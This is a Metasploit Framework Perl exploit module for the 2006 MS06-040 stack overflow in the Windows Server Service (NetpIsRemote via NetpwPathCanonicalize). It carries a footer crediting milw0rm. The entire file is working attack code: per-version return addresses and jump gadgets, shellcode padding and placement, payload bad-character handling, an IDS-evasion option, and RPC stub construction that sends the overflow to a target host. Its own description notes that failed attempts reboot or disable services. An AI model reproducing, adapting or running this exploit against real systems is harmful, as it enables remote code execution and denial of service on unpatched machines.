##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::netapi_ms06_040;
use base "Msf::Exploit";
use strict;

use Pex::DCERPC;
use Pex::NDR;

my $advanced = {
	'FragSize'    => [ 256, 'The DCERPC fragment size' ],
	'BindEvasion' => [ 0,   'IDS Evasion of the bind request' ],
	'DirectSMB'   => [ 0,   'Use direct SMB (445/tcp)' ],
  };

my $info = {
	'Name'    => 'Microsoft NetpIsRemote() MSO6-040 Overflow',
	'Version' => '$Revision: 3715 $',
	'Authors' =>
	  [
		'H D Moore <hdm [at] metasploit.com>',
	  ],

	'Arch' => ['x86'],
	'OS'   => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv' => 1,

	'AutoOpts' => { 'EXITFUNC' => 'thread' },
	
	'UserOpts' =>
	  {
		'RHOST' => [ 1, 'ADDR', 'The target address' ],

		# SMB connection options
		'SMBUSER' => [ 0, 'DATA', 'The SMB username to connect with', '' ],
		'SMBPASS' => [ 0, 'DATA', 'The password for specified SMB username', '' ],
		'SMBDOM'  => [ 0, 'DATA', 'The domain for specified SMB username', '' ],
	  },

	'Payload' =>
	  {
	  	# Technically we can use more space than this, but by limiting it
		# to 370 bytes we can use the same request for all Windows SPs.
		'Space'    => 370,
		
		'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
		'Keys'     => ['+ws2ord'],

		# sub esp, 4097 + inc esp makes stack happy
		'Prepend' => "\x81\xc4\xff\xef\xff\xff\x44",
	  },

	'Description' => Pex::Text::Freeform(
		qq{
        This module exploits a stack overflow in the NetApi32 NetpIsRemote() function
		using the NetpwPathCanonicalize RPC call in the Server Service. It is likely that
		other RPC calls could be used to exploit this service. This exploit will result in
		a denial of service on on Windows XP SP2 or Windows 2003 SP1. A failed exploit attempt
		will likely result in a complete reboot on Windows 2000 and the termination of all 
		SMB-related services on Windows XP. The default target for this exploit should succeed
		on Windows NT 4.0, Windows 2000 SP0-SP4+, and Windows XP SP0-SP1.
	  }
	  ),

	'Refs' =>
	  [
		[ 'BID', '19409' ],
		[ 'CVE', '2006-3439' ],
		[ 'MSB', 'MS06-040' ],
	  ],

	'DefaultTarget' => 0,
	'Targets'       =>
	  [
	  	[ '(wcscpy) Automatic (NT 4.0, 2000 SP0-SP4, XP SP0-SP1)' ],
		[ '(wcscpy) Windows NT 4.0 / Windows 2000 SP0-SP4', 1000, 0x00020804 ],
		[ '(wcscpy) Windows XP SP0/SP1', 612, 0x00020804 ],
		[ '(stack)  Windows XP SP1 English', 656, 680, 0x71ab1d54], # jmp esp @ ws2_32.dll
	  ],

	'Keys' => ['srvsvc'],

	'DisclosureDate' => 'Aug 08 2006',
  };

sub new {
	my ($class) = @_;
	my $self =
	  $class->SUPER::new( { 'Info' => $info, 'Advanced' => $advanced }, @_ );
	return ($self);
}

sub Exploit {
	my ($self)      = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target_name = '*SMBSERVER';

	my $FragSize = $self->GetVar('FragSize') || 256;
	my $target   = $self->Targets->[$target_idx];

	if (!$self->InitNops(128)) {
		$self->PrintLine("Could not initialize the nop module");
		return;
	}

	my ( $res, $rpc );

	my $pipe    = '\BROWSER';
	my $uuid    = '4b324fc8-1670-01d3-1278-5a47bf6ee188';
	my $version = '3.0';

	my $handle = Pex::DCERPC::build_handle( $uuid, $version, 'ncacn_np', $target_host, $pipe );

	my $dce = Pex::DCERPC->new(
		'handle'      => $handle,
		'username'    => $self->GetVar('SMBUSER'),
		'password'    => $self->GetVar('SMBPASS'),
		'domain'      => $self->GetVar('SMBDOM'),
		'fragsize'    => $self->GetVar('FragSize'),
		'bindevasion' => $self->GetVar('BindEvasion'),
		'directsmb'   => $self->GetVar('DirectSMB'),
	  );

	if ( !$dce ) {
		$self->PrintLine("[*] Could not bind to $handle");
		return;
	}

	my $smb = $dce->{'_handles'}{$handle}{'connection'};
	
	if (! $smb) {
		$self->PrintLine("[*] Could not establish SMB session");
		return;
	}

    if ( $target->[0] =~ /Automatic/ ) {
        if ( $smb->PeerNativeOS eq 'Windows 5.0' ) {
            $target = $self->Targets->[1];
            $self->PrintLine('[*] Detected a Windows 2000 target');
        }
        elsif ( $smb->PeerNativeOS eq 'Windows 5.1' ) {
            $target = $self->Targets->[2];
            $self->PrintLine('[*] Detected a Windows XP target');
			$self->PrintLine('[*] This will not work on SP2!');
        }
        elsif ( $smb->PeerNativeOS eq 'Windows 4.0' ) {
            $target = $self->Targets->[1];
            $self->PrintLine('[*] Detected a Windows NT 4.0 target');
			$self->PrintLine('[*] Please email us with the results!');
        }		
        else {
            $self->PrintLine('[*] No target available for ' . $smb->PeerNativeOS() );
            return;
        }
    }
		
	#
	#  /* Function 0x1f at 0x767e912c */
	#  long function_1f (
	#    [in] [unique] [string] wchar_t * arg_00,
	#    [in] [string] wchar_t * arg_01,
	#    [out] [size_is(arg_03)] char * arg_02,
	#    [in] [range(0, 64000)] long arg_03,
	#    [in] [string] wchar_t * arg_04,
	#    [in,out] long * arg_05,
	#    [in] long arg_06
	#  );
	#
	
	my $stub;

	#
	# Use the wcscpy() method on NT 4.0 / 2000
	#	
	if ($target->[0] =~ /2000/ && ! $target->[3]) {
	
		# Pad our shellcode out with nops
		$shellcode = $self->MakeNops($target->[1] - length($shellcode)) . $shellcode;
	
		# Stick it into a path
		my $path = 	$shellcode . (pack('V', $target->[2]) x 16) . "\x00\x00";

		# Package that into a stub
		$stub =
			Pex::NDR::Long(int(rand(0xffffffff))).
			Pex::NDR::UnicodeConformantVaryingString('').
			Pex::NDR::UnicodeConformantVaryingStringPreBuilt($path).
			Pex::NDR::Long(int(rand(250)+1)).
			Pex::NDR::UnicodeConformantVaryingStringPreBuilt( "\xeb\x02" . "\x00\x00").
			Pex::NDR::Long(int(rand(250)+1)).
			Pex::NDR::Long(0);	
	#
	# Use the wcscpy() method on XP SP0/SP1
	#	
	} elsif ($target->[0] =~ /XP/ && ! $target->[3]) {

		# XP SP0/SP1
		my $path = 	
			# Shellcode (corrupted ~420 bytes in)
			$shellcode.
			# Padding
			Pex::Text::AlphaNumText($target->[1] - length($shellcode)).
			# Land 6 bytes in to bypass garbage (XP SP0)
			pack('V', $target->[2] + 6).
			# Padding
			Pex::Text::AlphaNumText(8).
			# Address to write our shellcode (XP SP0)
			pack('V', $target->[2]).
			# Padding (required)
			Pex::Text::AlphaNumText(32).
			# Jump straight to shellcode (XP SP1)
			pack('V', $target->[2]).
			# Padding
			Pex::Text::AlphaNumText(8).						
			# Address to write our shellcode (XP SP1)
			pack('V', $target->[2]).
			# Padding (required)
			Pex::Text::AlphaNumText(32).			
			# Terminate
			"\x00\x00";

		# Package that into a stub
		$stub =
			Pex::NDR::Long(int(rand(0xffffffff))).
			Pex::NDR::UnicodeConformantVaryingString('').
			Pex::NDR::UnicodeConformantVaryingStringPreBuilt($path).
			Pex::NDR::Long(int(rand(250)+1)).
			Pex::NDR::UnicodeConformantVaryingString('').
			Pex::NDR::Long(int(rand(250)+1)).
			Pex::NDR::Long(0);

	#
	# Use the stack overflow method if a return address is set
	#
	} elsif( $target->[3]) {

		my $buff = Pex::Text::AlphaNumText(800);
		substr($buff, 0, length($shellcode), $shellcode);
		substr($buff, $target->[1], 4, pack('V', $target->[3]));
		substr($buff, $target->[2], 5, "\xe9" . pack('V', ($target->[1] + 5) * -1 ));
		
		my $path = "\\\x00\\\x00". $buff. "\x00\x00";

		# Package that into a stub
		$stub =
			Pex::NDR::Long(int(rand(0xffffffff))).
			Pex::NDR::UnicodeConformantVaryingString('').
			Pex::NDR::UnicodeConformantVaryingStringPreBuilt($path).
			Pex::NDR::Long(int(rand(250)+1)).
			Pex::NDR::UnicodeConformantVaryingString('').
			Pex::NDR::Long(int(rand(250)+1)).
			Pex::NDR::Long(0);
	} else {
		$self->PrintLine("This target is not currently supported");
		return;
	}


	$self->PrintLine("[*] Sending request...");
	
	# Function 0x1f is not the only way to exploit this :-)
	my @response = $dce->request( $handle, 0x1f, $stub );
	
	if ( length($dce->{'response'}->{'StubData'}) > 0) {
		$self->PrintLine("[*] The server rejected it, trying again...");
		@response = $dce->request( $handle, 0x1f, $stub );
	}
	
	if ( length($dce->{'response'}->{'StubData'}) > 0) {
		$self->PrintLine("[*] This system may be patched or running Windows XP SP1 or SP2");
	}
	
	if (@response) {
		$self->PrintLine('[*] RPC server responded with:');
		foreach my $line (@response) {
			$self->PrintLine( '[*] ' . $line );
		}
	}

	return;
}

1;

# milw0rm.com [2006-08-10]
